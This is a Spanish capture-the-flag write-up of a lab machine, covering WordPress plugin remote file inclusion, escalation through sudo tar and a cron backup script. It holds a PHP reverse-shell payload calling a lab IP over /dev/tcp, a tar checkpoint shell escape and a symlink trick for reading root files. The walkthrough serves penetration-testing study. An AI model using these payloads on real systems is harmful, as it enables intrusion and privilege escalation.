-----
- Tags: #rfi #rfi-to-rce #sudoers-tar #cron-job #wps #Gwolle-gb #symbolic-link  
-----
## Técnicas utilizadas
- RFI (Remote File Inclusion) - Abusing Wordpress Plugin [Gwolle-gb]  
- RFI to RCE (Creating our malicious PHP file)  
- Abusing Sudoers Privilege (Tar Command)  
- Abusing Cron Job (Privilege Escalation) [Code Analysis] [Bash Scripting]
------------
## Procedimiento

![[Pasted image 20230717201717.png]]

-------
#### Reconocimiento
Si lanzamos un **nmap** sobre el equipo podemos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p80 10.10.10.88 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 11:43 MST
Nmap scan report for 10.10.10.88
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-title: Landing Page

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds
```

Un escaneo con **whatweb** nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.88
http://10.10.10.88 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], Title[Landing Page]
```

Si inspeccionamos un poco la web, podemos dar con un **robots.txt** el cual contempla algunas rutas. Todas ellas nos regresan un **Not Found** a excepcion de una:
![[Pasted image 20230718115557.png]]

Dejando un lado esta ruta por un momento, podemos enumerar nosotros mismos por rutas que existan en el servicio **web** con herramientas como **Gobuster** o **Wfuzz**. Con cualquiera de las dos, podemos ver que nos descubre la ruta **Wp** la cual probablemente haga alución a **WordPress**:
![[Pasted image 20230718115820.png]]

Si ingresamos a la ruta vemos que no nos cargan algunos elementos de esta, esto es por que se esta aplicando **Virtual Hosting**, si inspeccioamos el **Source Code** encontramos un nombre de domino el cual podemos contemplar en el **/etc/hosts** y al volver a visitar la pagina podremos ver en su plenitud todo el contenido.

Con **Wfuzz** o **Gobuster** también podriamos intentar enumerar los **Plugins** existentes en el **wp**, **Seclist** tiene contemplado un diccionario con multiples **plugins** de **wordpress**:
![[Pasted image 20230718120255.png]]

-------
#### RFI (Remote File Inclusion) - Abusing Wordpress Plugin [Gwolle-gb]
Si buscamos por vulnerabilidades existentes en los plugins encontrados vemos que hay uno que es vulnerable a **Remote File Inclusion**
![[Pasted image 20230718121039.png]]

En el archivo de texto nos explica que existe una ruta la cual interpreta recursos de manera remota:
![[Pasted image 20230718121122.png]]

Podemos verificar si esto es cierto. Abrimos un servidor con **Python** y nos lanzamos una petición, si obtenemos un **GET** es por que es vulnerable:
![[Pasted image 20230718121141.png]]

Y efectivamente es vulnerable y esto no es todo, también podemos observar que intenta cargar un archivo desde nuestra maquina:
![[Pasted image 20230718121155.png]]

------------
#### RFI to RCE (Creating our malicious PHP file) 
Intentaremos aprovecharnos de esto para cargar un archivo **.php** malicioso, tiene que tener el nombre del archivo que esta intentando cargar para que este logre interpretarse y ejecute lo que desiamos:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'"); ?>
```

------------
#### Abusing Sudoers Privilege (Tar Command)
Si hacemos un **sudo -l** podremos observar que contamos con un privilegio a nivel de sudoers para ejecutar el comando **Tar** como un usuario del sistema:
![[Pasted image 20230718121230.png]]

Ahora, siguiente la guia de [GTFObins](https://gtfobins.github.io/gtfobins/tar/#sudo) podemos ver que si ejecutamos el siguiente comando podemos ejecutar una shell como el usuario que ejecuta el comando:
```
# sudo sexcott tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

-----------------
#### Abusing Cron Job (Privilege Escalation) [Code Analysis] [Bash Scripting]
Enumerando un poco la maquina, encontramos algunos **Rabit Holes**. Vamos a subir **Pspy** para ver los comandos que se estan ejecuntando a intervalos regulares de tiempo. Vemos un proceso interesante:
![[Pasted image 20230718124225.png]]

Si le hacemos un **cat** al binario, podemos ver su contenido:
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Hay algunas variables confusas, asi que intentamos redefinirlas para entenderlas mejor y quedaria asi:
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
tmpfile=/var/tmp/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > /var/backups/onuma_backup_test.txt

# Cleanup from last time.
/bin/rm -rf /var/tmp/.* /var/tmp/check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile /var/www/html/ &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r /var/www/html/ /var/tmp/check/var/www/html/
}

/bin/mkdir /var/tmp/check
/bin/tar -zxvf $tmpfile -C /var/tmp/check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> /var/backups/onuma_backup_error.txt
    integrity_chk >> /var/backups/onuma_backup_error.txt
    exit 2
else
    # Clean up and save archive to the /var/backups.
    /bin/mv $tmpfile /var/backups/onuma-www-dev.bak
    /bin/rm -rf /var/tmp/check .*
    exit 0
fi
```

Basicamente, en el script lo que sucede es que toma todo lo que hay en **/var/www/html** y crea un comprimido de esto en **/var/tmp**, despues espera 30 segundos, posteriormente lo descomprime y al resultado le aplica un diferencial. Si existe una diferencia, almacena el output en una variable la cual posteriormente crea un log en **/var/backup/**.

Podemos aprovecharnos de esto para leer archivos de la maquina de los cuales de primera no tenemos derecho a leerlos. Un ejemplo de esto seria la **flag** de root. Para lograr esto, podemos crear un comprimido de todo lo que hay en **/var/www/html** y creamos un link simbolico a algun archivo privilegiado tomando como archivo principal alguno de la carpeta original. En esta caso podemos tomar **Index.html**
```
# ln -s -f /root/root.txt index.html
```

Y ahora comprimimos todo el contenido de las carpetas:
```
tar -zcfv comprimido.tar var/www/html/
```

Ahora lo subimos a la maquina victima, esperamos a que se cree el archivo, lo borramos y cambiamos el nombre de nuestro comprimido al nombre del archivo que acabamos de borrar. Nos toca esperar a que se ejecute la tarea para poder ver el output:
![[Pasted image 20230718132525.png]]



